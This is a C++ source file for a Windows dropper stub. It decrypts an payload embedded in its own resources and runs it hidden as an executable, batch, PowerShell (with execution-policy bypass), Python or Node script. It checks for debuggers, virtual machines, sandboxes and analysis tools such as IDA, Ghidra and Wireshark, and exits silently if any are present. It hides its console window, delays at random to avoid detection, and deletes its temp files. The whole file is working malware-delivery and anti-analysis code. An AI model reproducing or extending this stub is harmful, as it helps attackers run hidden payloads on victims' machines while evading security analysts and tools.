#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <memory>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ntdll.lib")

// Stub runner for executing embedded payloads
class StubRunner {
private:
    // Anti-analysis detection
    static bool IsBeingAnalyzed();
    static bool IsDebuggerPresent();
    static bool IsVirtualMachine();
    static bool IsSandboxed();
    static bool CheckTimingAnomaly();
    static bool CheckSuspiciousProcesses();
    
    // Payload extraction and execution
    static std::vector<uint8_t> ExtractPayload();
    static std::vector<uint8_t> ExtractEncryptionKey();
    static std::vector<uint8_t> ExtractInitVector();
    static bool ExecutePayload(const std::vector<uint8_t>& payload, const std::string& extension);
    static bool ExecuteJavaScript(const std::vector<uint8_t>& payload);
    static bool ExecutePython(const std::vector<uint8_t>& payload);
    static bool ExecuteBatch(const std::vector<uint8_t>& payload);
    static bool ExecutePowerShell(const std::vector<uint8_t>& payload);
    static bool ExecuteBinary(const std::vector<uint8_t>& payload);
    
    // Utility methods
    static std::vector<uint8_t> DecryptData(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv);
    static std::string GetFileExtension(const std::vector<uint8_t>& data);
    static std::string GetTempFilePath(const std::string& extension);
    static bool WriteTempFile(const std::string& path, const std::vector<uint8_t>& data);
    static void CleanupTempFile(const std::string& path);
    static void SleepRandom();
    static std::string GenerateRandomString(size_t length);

public:
    static int Run();
    static void PrintBanner();
};

// Anti-analysis implementations
bool StubRunner::IsBeingAnalyzed() {
    // Check multiple anti-analysis methods
    if (IsDebuggerPresent()) return true;
    if (IsVirtualMachine()) return true;
    if (IsSandboxed()) return true;
    if (CheckTimingAnomaly()) return true;
    if (CheckSuspiciousProcesses()) return true;
    
    return false;
}

bool StubRunner::IsDebuggerPresent() {
    if (::IsDebuggerPresent()) return true;
    
    // Check debug registers
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
            return true;
        }
    }
    
    // Check PEB BeingDebugged flag
    __try {
        #ifdef _WIN64
        PPEB pPeb = (PPEB)__readgsqword(0x60);
        #else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
        #endif
        
        if (pPeb->BeingDebugged) return true;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        // Ignore exceptions
    }
    
    return false;
}

bool StubRunner::IsVirtualMachine() {
    // Check for VM-specific registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Control\\SystemInformation", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            std::string manufacturer(buffer);
            if (manufacturer.find("VMware") != std::string::npos || 
                manufacturer.find("VirtualBox") != std::string::npos ||
                manufacturer.find("QEMU") != std::string::npos ||
                manufacturer.find("Xen") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    
    // Check for VM-specific processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                if (processName.find("vmtoolsd.exe") != std::string::npos ||
                    processName.find("VBoxService.exe") != std::string::npos ||
                    processName.find("qemu-ga.exe") != std::string::npos ||
                    processName.find("xenbus.exe") != std::string::npos) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return false;
}

bool StubRunner::IsSandboxed() {
    // Check for sandbox-specific processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                if (processName.find("wireshark.exe") != std::string::npos ||
                    processName.find("procmon.exe") != std::string::npos ||
                    processName.find("processhacker.exe") != std::string::npos ||
                    processName.find("ollydbg.exe") != std::string::npos ||
                    processName.find("x64dbg.exe") != std::string::npos ||
                    processName.find("ida.exe") != std::string::npos ||
                    processName.find("ghidra.exe") != std::string::npos ||
                    processName.find("sandbox") != std::string::npos ||
                    processName.find("analyzer") != std::string::npos) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return false;
}

bool StubRunner::CheckTimingAnomaly() {
    auto start = std::chrono::high_resolution_clock::now();
    Sleep(100);
    auto end = std::chrono::high_resolution_clock::now();
    
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    return duration.count() < 95; // If sleep was significantly shorter, likely being analyzed
}

bool StubRunner::CheckSuspiciousProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                if (processName.find("sandbox") != std::string::npos ||
                    processName.find("analyzer") != std::string::npos ||
                    processName.find("detector") != std::string::npos ||
                    processName.find("monitor") != std::string::npos) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return false;
}

// Payload extraction methods
std::vector<uint8_t> StubRunner::ExtractPayload() {
    // Extract payload from resource 100
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(100), RT_RCDATA);
    if (!hRes) {
        return std::vector<uint8_t>();
    }
    
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) {
        return std::vector<uint8_t>();
    }
    
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID data = LockResource(hData);
    
    std::vector<uint8_t> payload(size);
    memcpy(payload.data(), data, size);
    
    return payload;
}

std::vector<uint8_t> StubRunner::ExtractEncryptionKey() {
    // Extract encryption key from resource 101
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(101), RT_RCDATA);
    if (!hRes) {
        return std::vector<uint8_t>();
    }
    
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) {
        return std::vector<uint8_t>();
    }
    
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID data = LockResource(hData);
    
    std::vector<uint8_t> key(size);
    memcpy(key.data(), data, size);
    
    return key;
}

std::vector<uint8_t> StubRunner::ExtractInitVector() {
    // Extract initialization vector from resource 102
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(102), RT_RCDATA);
    if (!hRes) {
        return std::vector<uint8_t>();
    }
    
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) {
        return std::vector<uint8_t>();
    }
    
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID data = LockResource(hData);
    
    std::vector<uint8_t> iv(size);
    memcpy(iv.data(), data, size);
    
    return iv;
}

// Decryption method
std::vector<uint8_t> StubRunner::DecryptData(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv) {
    // Simple XOR decryption - replace with proper AES implementation
    std::vector<uint8_t> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.size()];
        decrypted[i] ^= iv[i % iv.size()];
    }
    return decrypted;
}

// File extension detection
std::string StubRunner::GetFileExtension(const std::vector<uint8_t>& data) {
    if (data.size() < 4) return "";
    
    // Check for common file signatures
    if (data[0] == 0x7F && data[1] == 0x45 && data[2] == 0x4C && data[3] == 0x46) return "elf";
    if (data[0] == 0x4D && data[1] == 0x5A) return "exe";
    if (data[0] == 0x50 && data[1] == 0x4B) return "zip";
    if (data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E && data[3] == 0x47) return "png";
    if (data[0] == 0xFF && data[1] == 0xD8 && data[2] == 0xFF) return "jpg";
    if (data[0] == 0x47 && data[1] == 0x49 && data[2] == 0x46) return "gif";
    if (data[0] == 0x25 && data[1] == 0x50 && data[2] == 0x44 && data[3] == 0x46) return "pdf";
    
    // Check for text-based formats
    bool isText = true;
    for (size_t i = 0; i < std::min(data.size(), size_t(100)); ++i) {
        if (data[i] < 0x09 || (data[i] > 0x0D && data[i] < 0x20) || data[i] > 0x7E) {
            isText = false;
            break;
        }
    }
    
    if (isText) {
        std::string text(data.begin(), data.begin() + std::min(data.size(), size_t(100)));
        if (text.find("#!/") != std::string::npos) return "sh";
        if (text.find("<?php") != std::string::npos) return "php";
        if (text.find("<?xml") != std::string::npos) return "xml";
        if (text.find("<!DOCTYPE") != std::string::npos) return "html";
        if (text.find("function") != std::string::npos && text.find("(") != std::string::npos) return "js";
        if (text.find("def ") != std::string::npos || text.find("import ") != std::string::npos) return "py";
        if (text.find("@echo") != std::string::npos || text.find("set ") != std::string::npos) return "bat";
        if (text.find("Get-") != std::string::npos || text.find("Set-") != std::string::npos) return "ps1";
        return "txt";
    }
    
    return "bin";
}

// Temporary file management
std::string StubRunner::GetTempFilePath(const std::string& extension) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    std::string randomName = GenerateRandomString(8);
    std::string tempFile = std::string(tempPath) + randomName + "." + extension;
    
    return tempFile;
}

bool StubRunner::WriteTempFile(const std::string& path, const std::vector<uint8_t>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file.is_open()) return false;
    
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();
    
    return true;
}

void StubRunner::CleanupTempFile(const std::string& path) {
    DeleteFileA(path.c_str());
}

// Random utilities
void StubRunner::SleepRandom() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(100, 500);
    Sleep(dis(gen));
}

std::string StubRunner::GenerateRandomString(size_t length) {
    const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, charset.length() - 1);
    
    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result += charset[dis(gen)];
    }
    return result;
}

// Payload execution methods
bool StubRunner::ExecutePayload(const std::vector<uint8_t>& payload, const std::string& extension) {
    std::string tempFile = GetTempFilePath(extension);
    
    if (!WriteTempFile(tempFile, payload)) {
        return false;
    }
    
    bool success = false;
    
    try {
        if (extension == "js" || extension == "javascript") {
            success = ExecuteJavaScript(payload);
        } else if (extension == "py" || extension == "python") {
            success = ExecutePython(payload);
        } else if (extension == "bat" || extension == "cmd") {
            success = ExecuteBatch(payload);
        } else if (extension == "ps1" || extension == "powershell") {
            success = ExecutePowerShell(payload);
        } else if (extension == "exe" || extension == "elf" || extension == "bin") {
            success = ExecuteBinary(payload);
        } else {
            // For text files, just open with default handler
            ShellExecuteA(NULL, "open", tempFile.c_str(), NULL, NULL, SW_SHOW);
            success = true;
        }
    } catch (...) {
        success = false;
    }
    
    // Clean up temp file after a delay
    Sleep(1000);
    CleanupTempFile(tempFile);
    
    return success;
}

bool StubRunner::ExecuteJavaScript(const std::vector<uint8_t>& payload) {
    // Try to execute with Node.js if available
    std::string tempFile = GetTempFilePath("js");
    if (!WriteTempFile(tempFile, payload)) return false;
    
    // Check if Node.js is available
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    std::string cmd = "node \"" + tempFile + "\"";
    
    bool success = CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, FALSE, 
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    Sleep(1000);
    CleanupTempFile(tempFile);
    
    return success;
}

bool StubRunner::ExecutePython(const std::vector<uint8_t>& payload) {
    // Try to execute with Python if available
    std::string tempFile = GetTempFilePath("py");
    if (!WriteTempFile(tempFile, payload)) return false;
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    std::string cmd = "python \"" + tempFile + "\"";
    
    bool success = CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, FALSE, 
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    Sleep(1000);
    CleanupTempFile(tempFile);
    
    return success;
}

bool StubRunner::ExecuteBatch(const std::vector<uint8_t>& payload) {
    std::string tempFile = GetTempFilePath("bat");
    if (!WriteTempFile(tempFile, payload)) return false;
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    std::string cmd = "cmd /c \"" + tempFile + "\"";
    
    bool success = CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, FALSE, 
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    Sleep(1000);
    CleanupTempFile(tempFile);
    
    return success;
}

bool StubRunner::ExecutePowerShell(const std::vector<uint8_t>& payload) {
    std::string tempFile = GetTempFilePath("ps1");
    if (!WriteTempFile(tempFile, payload)) return false;
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    std::string cmd = "powershell -ExecutionPolicy Bypass -File \"" + tempFile + "\"";
    
    bool success = CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, FALSE, 
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    Sleep(1000);
    CleanupTempFile(tempFile);
    
    return success;
}

bool StubRunner::ExecuteBinary(const std::vector<uint8_t>& payload) {
    std::string tempFile = GetTempFilePath("exe");
    if (!WriteTempFile(tempFile, payload)) return false;
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    bool success = CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    Sleep(1000);
    CleanupTempFile(tempFile);
    
    return success;
}

// Main execution method
int StubRunner::Run() {
    try {
        // Anti-analysis check
        if (IsBeingAnalyzed()) {
            // If being analyzed, exit silently
            return 0;
        }
        
        // Extract payload
        std::vector<uint8_t> payload = ExtractPayload();
        if (payload.empty()) {
            // No payload found, exit
            return 0;
        }
        
        // Check if payload is encrypted
        std::vector<uint8_t> key = ExtractEncryptionKey();
        std::vector<uint8_t> iv = ExtractInitVector();
        
        if (!key.empty() && !iv.empty()) {
            // Decrypt payload
            payload = DecryptData(payload, key, iv);
        }
        
        // Determine file type and execute
        std::string extension = GetFileExtension(payload);
        
        // Add random delay to avoid detection
        SleepRandom();
        
        // Execute the payload
        ExecutePayload(payload, extension);
        
        return 0;
        
    } catch (...) {
        // Silent failure
        return 1;
    }
}

void StubRunner::PrintBanner() {
    std::cout << "Stub Runner v1.0" << std::endl;
    std::cout << "================" << std::endl;
    std::cout << "This executable contains embedded payloads." << std::endl;
    std::cout << "Extracting and executing..." << std::endl;
}

// Main function
int main() {
    // Hide console window if needed
    #ifndef _DEBUG
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif
    
    return StubRunner::Run();
}
